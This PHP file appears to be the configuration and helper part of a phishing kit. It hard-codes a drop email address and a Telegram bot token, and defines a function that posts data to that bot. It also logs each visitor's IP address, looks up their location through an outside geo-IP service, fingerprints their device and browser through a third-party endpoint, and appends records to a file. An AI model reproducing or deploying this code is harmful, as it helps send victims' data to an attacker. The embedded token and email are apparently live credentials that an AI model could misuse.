<?php
date_default_timezone_set("Asia/Jakarta");

$email_result = 'cilokcb@yandex.com';

define('API_KEY', '1847280168:AAGR9JY20lXvo44Xph9BrgAsYgwYnoJCy_E');
function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
    $res = curl_exec($ch);
    if (curl_error($ch)) {
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}

function getUserIP()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}

$ip = getUserIP();
if($ip == "127.0.0.1") {
    $ip = "";
}

function tulis_file($nama, $isi) {
  $click = fopen("$nama","a");
    fwrite($click,"$isi"."\n");
    fclose($click);
}

function get_ip($ip) {
    $url = 'http://ads.my.id/geoip/ip.php?ip='.$ip;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    $resp=curl_exec($ch);
    curl_close($ch);
    $resp = json_decode($resp,true);
    return $resp;
}

function get_device() {
    $ua = urlencode($_SERVER['HTTP_USER_AGENT']);
    $url = 'https://api.spm55-v3.vip/gg?ua='.$ua;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    $resp=curl_exec($ch);
    curl_close($ch);
    $resp = json_decode($resp,true);
    return $resp;
}


$lookup = get_ip($ip);
$country = $lookup['country'];
$cid = $lookup['countryCode'];
$region = $lookup['regionName'];
$city = $lookup['city'];
$isp = $lookup['isp'];
$timezone = $lookup['timezone'];

$user_agent = $_SERVER['HTTP_USER_AGENT'];
$device_json = get_device();
$device = $device_json['device'];
$os = $device_json['os'];
$br = $device_json['browser'];
$date = date("d M, Y");
$time = date("g:i a");
$date = trim($date . ", Time : " . $time);
?>